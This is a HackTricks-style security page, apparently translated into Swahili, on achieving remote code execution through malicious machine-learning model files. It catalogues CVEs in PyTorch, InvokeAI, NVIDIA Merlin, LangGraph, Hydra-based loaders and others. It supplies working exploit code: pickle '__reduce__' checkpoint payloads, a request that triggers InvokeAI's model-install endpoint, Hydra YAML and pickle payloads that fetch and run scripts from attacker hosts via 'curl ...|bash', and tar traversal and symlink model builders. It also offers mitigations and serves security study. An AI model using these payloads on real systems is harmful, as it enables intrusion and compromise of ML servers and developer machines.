# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Kupakia models hadi RCE

Machine Learning models kwa kawaida hushirikiwa katika formats tofauti, kama vile ONNX, TensorFlow, PyTorch, na nyinginezo. Models hizi zinaweza kupakiwa kwenye machines za developers au production systems ili zitumike. Kwa kawaida models hazipaswi kuwa na code hasidi, lakini kuna baadhi ya hali ambapo model inaweza kutumika kutekeleza arbitrary code kwenye system kama feature iliyokusudiwa au kutokana na vulnerability katika model loading library.

Wakati wa kuandika haya, hii ni baadhi ya mifano ya vulnerabilities za aina hii:

| **Framework / Tool**        | **Vulnerability (CVE ikiwa inapatikana)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle katika model checkpoint husababisha code execution (ikikwepa safeguard ya `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download husababisha code execution; Java deserialization RCE katika management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization kupitia `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint hu-trigger pickle reducer wakati wa `load_model_trainer_states_from_checkpoint` → code execution katika ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | `filter` key inayodhibitiwa na user huingiza syntax ya SQL/JSON-path, `UNION SELECT` hutengeneza fake checkpoint row, kisha `msgpack` deserialization hu-import na kuita Python code iliyochaguliwa na attacker | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Kupakia model kutoka YAML hutumia `yaml.unsafe_load` (code exec) <br> Kupakia model yenye layer ya **Lambda** huendesha arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Model ya `.tflite` iliyotengenezwa kwa makusudi hu-trigger integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Kupakia model kupitia `joblib.load` hu-execute pickle yenye `__reduce__` payload ya attacker                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | Default ya `numpy.load` iliruhusu pickled object arrays – malicious `.npy/.npz` hu-trigger code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path inaweza kutoka nje ya directory (kusoma arbitrary files) <br> Malicious ONNX model tar inaweza ku-overwrite arbitrary files (na kusababisha RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model yenye custom operator inahitaji kupakiwa native code ya attacker; complex model graphs hutumia vibaya logic kutekeleza computations zisizokusudiwa   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Kutumia model-load API huku `--model-control` ikiwa enabled huruhusu relative path traversal kuandika files (kwa mfano, ku-overwrite `.bashrc` kwa ajili ya RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file husababisha heap buffer overflows katika parser, na kuwezesha arbitrary code execution kwenye victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model yenye Lambda layer code bado hu-execute wakati wa kupakiwa (Keras safe_mode haifunikii old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | ML tools nyingi (kwa mfano, pickle-based model formats, Python `pickle.load`) zita-execute arbitrary code iliyowekwa ndani ya model files isipokuwa hatua za mitigation zitumike | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata inayopitishwa kwa `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Model metadata/config inayodhibitiwa na attacker huweka `_target_` kuwa arbitrary callable (kwa mfano, `builtins.exec`) → hu-execute wakati wa load, hata kwa “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Zaidi ya hayo, kuna baadhi ya models za Python zinazotumia pickle, kama zile zinazotumiwa na [PyTorch](https://github.com/pytorch/pytorch/security), ambazo zinaweza kutumika kutekeleza arbitrary code kwenye system ikiwa hazitapakiwa kwa `weights_only=True`. Kwa hiyo, model yoyote inayotumia pickle inaweza kuwa susceptible hasa kwa aina hii ya attacks, hata kama haijaorodheshwa kwenye table hapo juu.

### Hydra metadata → RCE (inafanya kazi hata kwa safetensors)

`hydra.utils.instantiate()` hu-import na kuita dotted `_target_` yoyote katika configuration/metadata object. Libraries zinapopitisha **untrusted model metadata** kwenye `instantiate()`, attacker anaweza kutoa callable na arguments zinazo-run mara moja wakati wa model load (hakuna pickle inayohitajika).<sup>[[12]](#references)</sup>

Mfano wa payload (inafanya kazi katika `model_config.yaml` ya `.nemo`, `config.json` ya repo, au `__metadata__` ndani ya `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Mambo muhimu:
- Huchochewa kabla ya model initialization katika `restore_from/from_pretrained` ya NeMo, HuggingFace coders za uni2TS, na FlexTok loaders.
- Hydra string block-list inaweza kuepukwa kupitia import paths mbadala (kwa mfano, `enum.bltns.eval`) au majina yanayotatuliwa na application (kwa mfano, `nemo.core.classes.common.os.system` → `posix`).
- FlexTok pia huchanganua metadata iliyobadilishwa kuwa string kwa kutumia `ast.literal_eval`, na hivyo kuwezesha DoS (CPU/memory blowup) kabla ya Hydra call.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` ni web interface maarufu ya open-source kwa Stable-Diffusion. Versions **5.3.1 – 5.4.2** zinaweka wazi REST endpoint `/api/v2/models/install`, inayowaruhusu watumiaji kupakua na kupakia models kutoka URLs za kiholela.<sup>[[1]](#references)</sup>

Kwa ndani, endpoint hatimaye huita:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
When file iliyotolewa ni **PyTorch checkpoint (`*.ckpt`)**, `torch.load` hufanya **pickle deserialization**. Kwa sababu maudhui yanatoka moja kwa moja kwenye URL inayodhibitiwa na mtumiaji, mshambulizi anaweza kuingiza object hasidi yenye method maalum ya `__reduce__` ndani ya checkpoint; method hiyo hutekelezwa **wakati wa deserialization**, na kusababisha **remote code execution (RCE)** kwenye server ya InvokeAI.

Vulnerability hii ilipewa **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Mwongozo wa Exploitation

1. Unda checkpoint hasidi:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Weka `payload.ckpt` kwenye HTTP server unayoidhibiti (kwa mfano, `http://ATTACKER/payload.ckpt`).
3. Anzisha endpoint iliyo hatarini (authentication haihitajiki):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wakati InvokeAI inapopakua faili, huita `torch.load()` → kifaa cha `os.system` huendeshwa na attacker hupata code execution katika muktadha wa process ya InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` huautomate mtiririko mzima.<sup>[[3]](#references)</sup>

#### Masharti

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)
•  `/api/v2/models/install` inafikika na attacker
•  Process ina ruhusa za kutekeleza shell commands

#### Mitigation

* Upgrade hadi **InvokeAI ≥ 5.4.3** – patch huweka `scan=True` kwa default na kufanya malware scanning kabla ya deserialization.
* Unapopakia checkpoints programmatically, tumia `torch.load(file, weights_only=True)` au helper mpya [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Tekeleza allow-lists / signatures kwa model sources na endesha service kwa least-privilege.

> ⚠️ Kumbuka kuwa format yoyote inayotumia Python pickle (ikiwemo faili nyingi za `.pt`, `.pkl`, `.ckpt`, `.pth`) kwa asili si salama ku-deserialize kutoka kwa sources zisizoaminika.

---

Mfano wa mitigation ya ad-hoc ikiwa ni lazima uendelee kutumia matoleo ya zamani ya InvokeAI nyuma ya reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE kupitia `torch.load` isiyo salama (CVE-2025-23298)

NVIDIA’s Transformers4Rec (sehemu ya Merlin) ilifichua checkpoint loader isiyo salama iliyokuwa ikiita moja kwa moja `torch.load()` kwenye paths zilizotolewa na mtumiaji. Kwa sababu `torch.load` hutegemea Python `pickle`, checkpoint inayodhibitiwa na attacker inaweza kutekeleza code kiholela kupitia reducer wakati wa deserialization.<sup>[[5]](#references)</sup>

Path iliyo hatarini (kabla ya marekebisho): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Kwa nini hii husababisha RCE: Katika Python pickle, object inaweza kufafanua reducer (`__reduce__`/`__setstate__`) inayorejesha callable na arguments. Callable hiyo hutekelezwa wakati wa unpickling. Ikiwa object kama hiyo ipo kwenye checkpoint, huendeshwa kabla ya weights yoyote kutumiwa.

Mfano mdogo wa checkpoint hasidi:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Njia za uwasilishaji na eneo la madhara:
- Checkpoints/models zilizo na Trojan zinazosambazwa kupitia repos, buckets, au artifact registries
- Pipelines za automated resume/deploy zinazopakia checkpoints kiotomatiki
- Utekelezaji hufanyika ndani ya training/inference workers, mara nyingi wakiwa na privileges zilizoinuliwa (kwa mfano, root ndani ya containers)

Marekebisho: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ilibadilisha `torch.load()` ya moja kwa moja na deserializer yenye vikwazo na allow-list, iliyotekelezwa katika `transformers4rec/utils/serialization.py`. Loader mpya huthibitisha types/fields na huzuia arbitrary callables kuitwa wakati wa upakiaji.<sup>[[7]](#references)</sup>

Mwongozo wa ulinzi maalum kwa PyTorch checkpoints:
- Usifanye unpickle data isiyoaminika. Pendelea formats zisizotekeleza code kama [Safetensors](https://huggingface.co/docs/safetensors/index) au ONNX inapowezekana.
- Ikiwa ni lazima utumie PyTorch serialization, hakikisha `weights_only=True` (inayotumika katika PyTorch mpya zaidi) au tumia custom allow-listed unpickler inayofanana na patch ya Transformers4Rec.
- Thibitisha model provenance/signatures na sandbox deserialization (seccomp/AppArmor; non-root user; FS yenye vikwazo na bila network egress).
- Fuatilia child processes zisizotarajiwa kutoka kwa ML services wakati wa kupakia checkpoint; fuatilia matumizi ya `torch.load()`/`pickle`.

POC na marejeo ya vulnerable/patch:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Mfano – kuunda malicious PyTorch model

- Unda model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Pakia modeli:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization ya Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD inaweka wazi `resnet` endpoint inayofanya deserialization ya data inayodhibitiwa na mtumiaji. ZDI ilithibitisha kuwa mshambuliaji wa mbali anaweza kumshawishi mwathiriwa kupakia ukurasa/faili hasidi, kuisukuma crafted serialized blob kwenye endpoint hiyo, na kusababisha deserialization kama `root`, hivyo kusababisha compromise kamili.

Exploit flow inafanana na matumizi mabaya ya kawaida ya pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Gadget yoyote inayoweza kufikiwa wakati wa deserialization (constructors, `__setstate__`, framework callbacks, n.k.) inaweza kutumiwa kama weapon kwa njia hiyo hiyo, bila kujali kama transport ilikuwa HTTP, WebSocket, au faili lililowekwa kwenye directory inayofuatiliwa.



### LangGraph checkpointer SQLi → MessagePack RCE

Attack chain hii inavutia kwa sababu attacker **hahitajiki ku-upload malicious model file**. Badala yake, application inaonyesha **AI-agent persistence API** (`get_state_history(..., filter=...)`), na user input inafika kwenye checkpointer query builder.

#### 1. Structural SQLi katika metadata filters

SQLite pattern iliyo vulnerable ilionekana hivi:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Thamani inafungwa baadaye, lakini `query_key` inaunganishwa kwenye **JSON path string**, kwa hivyo `'` ndani ya dictionary key inavunja kutoka kwenye `'$.{query_key}'` na kuingiza SQL. Somo hilohilo linatumika kwa **JSON paths, identifiers, operators, `LIMIT`, na TTL fields**: placeholders hulinda values pekee, si query syntax ya kimuundo.

#### 2. `UNION SELECT` inaweza kulenga downstream sinks, si wizi wa data pekee

Query inarudisha `type` na serialized `checkpoint` bytes, ambazo baadaye hutumiwa kama:
```python
self.serde.loads_typed((type, checkpoint))
```
Hiyo inamaanisha SQLi katika `WHERE` clause inaweza kuingiza **safu bandia ya matokeo**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Ikiwa code ya baadaye itachanganua, ku-deserialize, kuandika, au kutekeleza column yoyote iliyochaguliwa, husianisha columns hizo na sinks zao. Katika hali hii, fake row hubadilisha SQLi kuwa **deserialization inayodhibitiwa na attacker**.

#### 3. Unsafe MessagePack extension hooks ni sawa na code gadgets

Njia ya `msgpack` ya LangGraph ilitumia custom extension hook iliyofungua nested tuple na kutekeleza:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Kwa hivyo, MessagePack extension object inayosimba kitu sawa na `("os", "system", "id > /tmp/pwned")` hu-import `os`, hutatua `system`, na kutekeleza command. Unapokagua AI frameworks, chunguza **custom MessagePack/JSON/pickle revivers** kwa dynamic imports, reflection, au arbitrary callable dispatch.

#### 4. Muundo wa vitendo wa audit kwa agent frameworks

Kagua input yoyote inayodhibitiwa na mtumiaji inayofikia:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders zinazozalisha vipande vya SQL au Redis query
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths zinazoamini rows zilizorejeshwa kutoka persistence layer

Msururu huu maalum uliathiri deployments za self-hosted LangGraph zinazotumia **SQLite** au **Redis** checkpointers wakati watumiaji wasioaminika wangeweza kudhibiti `filter`. Matoleo yaliyopatched yaliyoainishwa kwenye disclosure yalikuwa `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, na `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Models hadi Path Traversal

Kama ilivyoelezwa kwenye [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), miundo mingi ya models inayotumiwa na AI frameworks tofauti inategemea archives, kwa kawaida `.zip`. Kwa hivyo, huenda ikawezekana kutumia vibaya miundo hii kutekeleza mashambulizi ya Path Traversal, yanayoruhusu kusoma files arbitrary kutoka kwenye system ambako model ime-load.<sup>[[16]](#references)</sup>

Kwa mfano, kwa kutumia code ifuatayo unaweza kuunda model itakayounda file kwenye directory ya `/tmp` inapopakiwa:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Au, kwa kutumia code ifuatayo unaweza kuunda model itakayounda symlink kwenda kwenye directory ya `/tmp` inapopakiwa:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Uchambuzi wa kina: Keras .keras deserialization na utafutaji wa gadgets

Kwa mwongozo maalum kuhusu mambo ya ndani ya .keras, Lambda-layer RCE, tatizo la arbitrary import katika ≤ 3.8, na ugunduzi wa gadgets baada ya marekebisho ndani ya allowlist, tazama:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Marejeo

- [1] [Blogu ya OffSec – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit ya marekebisho ya InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Nyaraka za Rapid7 Metasploit module](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – mambo ya usalama ya torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blogu ya ZDI – CVE-2025-23298 Kupata Remote Code Execution katika NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Ushauri wa ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit ya marekebisho ya Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Loader iliyo katika mazingira hatarishi kabla ya marekebisho (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader baada ya marekebisho (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Nyaraka za Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit ya Hydra block-list (onyo kuhusu RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Utafiti wa Check Point – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Kubadilisha Archive Slip Bugs kuwa Bounties zenye Thamani ya Juu za AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
